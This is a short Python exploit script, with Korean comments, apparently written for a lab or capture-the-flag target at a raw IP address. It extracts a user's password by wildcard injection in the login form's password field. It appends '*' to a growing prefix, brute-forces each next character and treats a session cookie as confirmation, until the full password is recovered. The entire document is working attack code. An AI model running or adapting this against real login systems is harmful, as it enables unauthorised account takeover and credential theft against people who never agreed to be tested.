import requests
import string

url = "http://83.136.253.59:35443/login"
username = "reese"
charset = string.ascii_letters + string.digits + "!@#$%^&()-_=+[]{}|;:',.<>?/\\\""  # 필요 시 특수문자 추가
prefix = ""

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

def is_valid(response):
    # 성공 시: 리다이렉트 + Set-Cookie 헤더에 'mysession' 존재
    return "Set-Cookie" in response.headers and "mysession=" in response.headers.get("Set-Cookie", "")

while True:
    found = False
    for c in charset:
        test = prefix + c
        injected = f"{test}*"
        data = {
            "username": username,
            "password": injected
        }
        response = session.post(url, headers=headers, data=data, allow_redirects=False)
        print(f"[*] Trying: {test}*")

        if is_valid(response):
            print(f"[+] Match: {test}*")
            prefix = test
            found = True
            break

    if not found:
        print(f"[✓] Password found: {prefix}")
        break
